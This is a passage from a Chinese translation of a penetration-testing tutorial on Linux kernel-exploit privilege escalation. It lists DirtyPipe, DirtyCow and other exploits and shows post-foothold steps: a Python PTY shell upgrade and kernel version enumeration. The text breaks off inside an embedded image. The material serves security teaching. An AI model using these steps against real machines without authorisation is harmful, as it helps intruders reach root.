<!doctype html>
<html lang="zh" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-渗透/Linux 提权/Linux 提权-内核利用" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.7.0">
<title data-rh="true">Linux 提权-内核利用 | 扛枪的书生</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://kqdssheng.github.io/web/img/docusaurus-social-card.jpg"><meta data-rh="true" name="twitter:image" content="https://kqdssheng.github.io/web/img/docusaurus-social-card.jpg"><meta data-rh="true" property="og:url" content="https://kqdssheng.github.io/web/docs/渗透/Linux 提权/Linux 提权-内核利用"><meta data-rh="true" property="og:locale" content="zh"><meta data-rh="true" name="docusaurus_locale" content="zh"><meta data-rh="true" name="docsearch:language" content="zh"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="Linux 提权-内核利用 | 扛枪的书生"><meta data-rh="true" name="description" content="本文通过 Google 翻译 Kernel Exploits – Linux Privilege Escalation 这篇文章所产生，本人仅是对机器翻译中部分表达别扭的字词进行了校正及个别注释补充。"><meta data-rh="true" property="og:description" content="本文通过 Google 翻译 Kernel Exploits – Linux Privilege Escalation 这篇文章所产生，本人仅是对机器翻译中部分表达别扭的字词进行了校正及个别注释补充。"><link data-rh="true" rel="icon" href="/web/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://kqdssheng.github.io/web/docs/渗透/Linux 提权/Linux 提权-内核利用"><link data-rh="true" rel="alternate" href="https://kqdssheng.github.io/web/docs/渗透/Linux 提权/Linux 提权-内核利用" hreflang="zh"><link data-rh="true" rel="alternate" href="https://kqdssheng.github.io/web/docs/渗透/Linux 提权/Linux 提权-内核利用" hreflang="x-default"><link data-rh="true" rel="preconnect" href="https://SPYLCPE3W9-dsn.algolia.net" crossorigin="anonymous"><link rel="alternate" type="application/rss+xml" href="/web/blog/rss.xml" title="扛枪的书生 RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/web/blog/atom.xml" title="扛枪的书生 Atom Feed">




<link rel="search" type="application/opensearchdescription+xml" title="扛枪的书生" href="/web/opensearch.xml"><link rel="stylesheet" href="/web/assets/css/styles.bd0a5f0e.css">
<script src="/web/assets/js/runtime~main.224207a9.js" defer="defer"></script>
<script src="/web/assets/js/main.e046f592.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();t(null!==e?e:"light")}(),function(){try{const n=new URLSearchParams(window.location.search).entries();for(var[t,e]of n)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><link rel="preload" as="image" href="/web/img/logo.svg"><div role="region" aria-label="跳到主要内容"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">跳到主要内容</a></div><nav aria-label="主导航" class="navbar navbar--fixed-top navbarHideable_m1mJ navbar--primary"><div class="navbar__inner"><div class="navbar__items"><button aria-label="切换导航栏" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/web/"><div class="navbar__logo"><img src="/web/img/logo.svg" alt="kqdssheng" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/web/img/logo.svg" alt="kqdssheng" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div></a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/web/docs/">文章</a><a class="navbar__item navbar__link" href="/web/blog">说说</a><div class="navbar__item dropdown dropdown--hoverable"><a href="#" aria-haspopup="true" aria-expanded="false" role="button" class="navbar__link">其它</a><ul class="dropdown__menu"><li><a href="https://www.douban.com/doulist/154252035/" target="_blank" rel="noopener noreferrer" class="dropdown__link">豆瓣<svg width="12" height="12" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li><li><a href="https://www.zhihu.com/people/KqdsshenG" target="_blank" rel="noopener noreferrer" class="dropdown__link">知乎<svg width="12" height="12" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li><li><a href="https://www.cnblogs.com/kqdssheng" target="_blank" rel="noopener noreferrer" class="dropdown__link">博客园<svg width="12" height="12" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li><li><a href="https://github.com/kqdssheng" target="_blank" rel="noopener noreferrer" class="dropdown__link">GitHub<svg width="12" height="12" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li></ul></div></div><div class="navbar__items navbar__items--right"><div class="navbarSearchContainer_Bca1"><button type="button" class="DocSearch DocSearch-Button" aria-label="搜索 (Command+K)"><span class="DocSearch-Button-Container"><svg width="20" height="20" class="DocSearch-Search-Icon" viewBox="0 0 20 20" aria-hidden="true"><path d="M14.386 14.386l4.0877 4.0877-4.0877-4.0877c-2.9418 2.9419-7.7115 2.9419-10.6533 0-2.9419-2.9418-2.9419-7.7115 0-10.6533 2.9418-2.9419 7.7115-2.9419 10.6533 0 2.9419 2.9418 2.9419 7.7115 0 10.6533z" stroke="currentColor" fill="none" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round"></path></svg><span class="DocSearch-Button-Placeholder">搜索</span></span><span class="DocSearch-Button-Keys"></span></button></div><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="切换浅色/暗黑模式（当前为浅色模式）" aria-label="切换浅色/暗黑模式（当前为浅色模式）" aria-live="polite" aria-pressed="false"><svg viewBox="0 0 24 24" width="24" height="24" class="lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" class="darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg></button></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="回到顶部" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd sidebarWithHideableNavbar_wUlq"><a tabindex="-1" class="sidebarLogo_isFc" href="/web/"><img src="/web/img/logo.svg" alt="kqdssheng" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/web/img/logo.svg" alt="kqdssheng" class="themedComponent_mlkZ themedComponent--dark_xIcU"></a><nav aria-label="文档侧边栏" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/web/docs/">软件百宝箱</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" href="/web/docs/category/渗透">渗透</a><button aria-label="折叠侧边栏分类 &#x27;渗透&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" tabindex="0" href="/web/docs/category/linux-提权">Linux 提权</a><button aria-label="折叠侧边栏分类 &#x27;Linux 提权&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-Capabilities">Linux 提权-Capabilities</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-Cron Jobs">Linux 提权-Cron Jobs</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-Docker 容器">Linux 提权-Docker 容器</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-LXD 容器">Linux 提权-LXD 容器</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-MySQL UDF">Linux 提权-MySQL UDF</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-NFS 共享">Linux 提权-NFS 共享</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-SUID_SGID_1">Linux 提权-SUID_SGID_1</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-SUID_SGID_2">Linux 提权-SUID_SGID_2</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-Sudo_1">Linux 提权-Sudo_1</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-Sudo_2">Linux 提权-Sudo_2</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-内核利用">Linux 提权-内核利用</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-密码搜寻">Linux 提权-密码搜寻</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权指南">Linux 提权指南</a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/web/docs/category/windows-提权">Windows 提权</a><button aria-label="展开侧边栏分类 &#x27;Windows 提权&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/web/docs/category/杂项">杂项</a><button aria-label="展开侧边栏分类 &#x27;杂项&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/web/docs/category/linux">Linux</a><button aria-label="展开侧边栏分类 &#x27;Linux&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/web/docs/category/windows">Windows</a><button aria-label="展开侧边栏分类 &#x27;Windows&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/web/docs/category/杂项-1">杂项</a><button aria-label="展开侧边栏分类 &#x27;杂项&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li></ul></nav><button type="button" title="收起侧边栏" aria-label="收起侧边栏" class="button button--secondary button--outline collapseSidebarButton_PEFL"><svg width="20" height="20" aria-hidden="true" class="collapseSidebarButtonIcon_kv0_"><g fill="#7a7a7a"><path d="M9.992 10.023c0 .2-.062.399-.172.547l-4.996 7.492a.982.982 0 01-.828.454H1c-.55 0-1-.453-1-1 0-.2.059-.403.168-.551l4.629-6.942L.168 3.078A.939.939 0 010 2.528c0-.548.45-.997 1-.997h2.996c.352 0 .649.18.828.45L9.82 9.472c.11.148.172.347.172.55zm0 0"></path><path d="M19.98 10.023c0 .2-.058.399-.168.547l-4.996 7.492a.987.987 0 01-.828.454h-3c-.547 0-.996-.453-.996-1 0-.2.059-.403.168-.551l4.625-6.942-4.625-6.945a.939.939 0 01-.168-.55 1 1 0 01.996-.997h3c.348 0 .649.18.828.45l4.996 7.492c.11.148.168.347.168.55zm0 0"></path></g></svg></button></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="页面路径"><ul class="breadcrumbs" itemscope="" itemtype="https://schema.org/BreadcrumbList"><li class="breadcrumbs__item"><a aria-label="主页面" class="breadcrumbs__link" href="/web/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item"><a class="breadcrumbs__link" itemprop="item" href="/web/docs/category/渗透"><span itemprop="name">渗透</span></a><meta itemprop="position" content="1"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item"><a class="breadcrumbs__link" itemprop="item" href="/web/docs/category/linux-提权"><span itemprop="name">Linux 提权</span></a><meta itemprop="position" content="2"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link" itemprop="name">Linux 提权-内核利用</span><meta itemprop="position" content="3"></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">本页总览</button></div><div class="theme-doc-markdown markdown"><header><h1>Linux 提权-内核利用</h1></header><blockquote>
<p>本文通过 Google 翻译 <a href="https://juggernaut-sec.com/kernel-exploits-lpe/" target="_blank" rel="noopener noreferrer">Kernel Exploits – Linux Privilege Escalation</a> 这篇文章所产生，本人仅是对机器翻译中部分表达别扭的字词进行了校正及个别注释补充。</p>
</blockquote>
<hr>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="导航">导航<a href="#导航" class="hash-link" aria-label="导航的直接链接" title="导航的直接链接">​</a></h2>
<ul>
<li><a href="#id0">0 前言</a></li>
<li><a href="#id1">1 内核简介</a></li>
<li><a href="#id2">2 寻找内核漏洞</a>
<ul>
<li><a href="#id2.1">2.1 发现内核版本</a></li>
<li><a href="#id2.2">2.2 手动查找内核漏洞</a>
<ul>
<li><a href="#id2.2.1">2.2.1 通过 Google 查找内核漏洞</a></li>
<li><a href="#id2.2.2">2.2.2 通过 Searchsploit 查找内核漏洞</a></li>
</ul>
</li>
<li><a href="#id2.3">2.3 自动查找内核漏洞</a>
<ul>
<li><a href="#id2.3.1">2.3.1 Linux_Exploit_Suggester</a></li>
<li><a href="#id2.3.2">2.3.2 LinPEAS</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#id3">3 编译/执行内核漏洞</a>
<ul>
<li><a href="#id3.1">3.1 检查受害机编译环境</a></li>
<li><a href="#id3.2">3.2 在受害者机编译并执行 DirtyPipe</a></li>
<li><a href="#id3.3">3.3 在其它机器编译内核漏洞</a></li>
</ul>
</li>
<li><a href="#id4">4 多种内核漏洞利用示例</a>
<ul>
<li><a href="#id4.1">4.1 Half-Nelson/Full-Nelson 示例</a></li>
<li><a href="#id4.2">4.2 Memodipper 示例</a></li>
<li><a href="#id4.3">4.3 DirtyCow/DirtyCow2 示例</a></li>
<li><a href="#id4.4">4.4 eBPF Verifier示例</a></li>
</ul>
</li>
<li><a href="#id5">5 最后的想法</a></li>
</ul>
<hr>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="0前言"><strong><div id="id0">0、前言</div></strong><a href="#0前言" class="hash-link" aria-label="0前言的直接链接" title="0前言的直接链接">​</a></h2>
<p>在这篇文章中，我们将探索可用于从标准用户到 root 的 Linux 权限提升的各种内核漏洞。</p>
<p>我们将首先使用各种命令来查找受害主机上的内核版本。然后，我们将看到多种方法来查找针对我们目标内核版本的内核漏洞。最后，我们将看到六种不同内核漏洞的演示，这些漏洞涵盖了从 2010 年到现在的几乎所有内核版本。</p>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="1内核简介"><strong><div id="id1">1、内核简介</div></strong><a href="#1内核简介" class="hash-link" aria-label="1内核简介的直接链接" title="1内核简介的直接链接">​</a></h2>
<p>当谈到内核时，了解它的用途非常重要，这样我们才能理解它为何容易受到攻击。</p>
<p>内核本质上是一种促进硬件和软件之间交互的“计算机程序”。这意味着内核位于应用程序（软件）和 CPU/内存/设备/等（硬件）之间。内核的工作是将来自软件的输入/输出（I/O）请求转换为在软件和硬件之间交互的指令集。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240604155352682-1184721351-7e411eaf47119c340fd5ebc35a4f5ba5.png" width="206" height="245" class="img_ev3q"></p>
<p>内核是继引导加载程序之后加载的第一个程序。加载后，它控制和协调其他所有程序和进程，并确保正确分配内存。</p>
<blockquote>
<p>如果您有兴趣了解 Windows 内核漏洞，请查看我关于该主题的两篇文章<a href="https://juggernaut-sec.com/kernel-exploits-part-1/" target="_blank" rel="noopener noreferrer">here</a>和<a href="https://juggernaut-sec.com/kernel-exploits-part-2/" target="_blank" rel="noopener noreferrer">here</a>。</p>
</blockquote>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="2寻找内核漏洞"><strong><div id="id2">2、寻找内核漏洞</div></strong><a href="#2寻找内核漏洞" class="hash-link" aria-label="2寻找内核漏洞的直接链接" title="2寻找内核漏洞的直接链接">​</a></h2>
<p>对于第一个示例，我们假设已经作为标准用户在 Linux 机器上获得了立足点。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240604155353243-1090718494-ac64313e65aef1f73403e37a49879861.png" width="484" height="125" class="img_ev3q"></p>
<p>获得立足点后我们需要做的第一件事就是将 shell 升级到完整的 TTY【如果目标环境支持python的话】，我们可以使用以下命令来完成这项工作：</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;);&#x27;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">CTRL + Z</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">stty raw -echo;fg</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">export TERM=xterm</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240604155353243-529604798-9b559547e4b9c380ec4cce137c52251e.png" width="581" height="174" class="img_ev3q"></p>
<p>现在我们有了完整的 TTY，我们可以使用箭头浏览命令历史记录、使用制表符补全、清除终端等。</p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="21发现内核版本"><strong><div id="id2.1">2.1、发现内核版本</div></strong><a href="#21发现内核版本" class="hash-link" aria-label="21发现内核版本的直接链接" title="21发现内核版本的直接链接">​</a></h4>
<p>在寻找内核漏洞时，我们需要枚举的第一件事是目标主机上的内核版本。这可以通过几种不同的方式来完成，首先是使用带有 -r 开关的 uname 命令，它只会告诉我们内核版本本身。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">uname -r</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="data:image/png;base64,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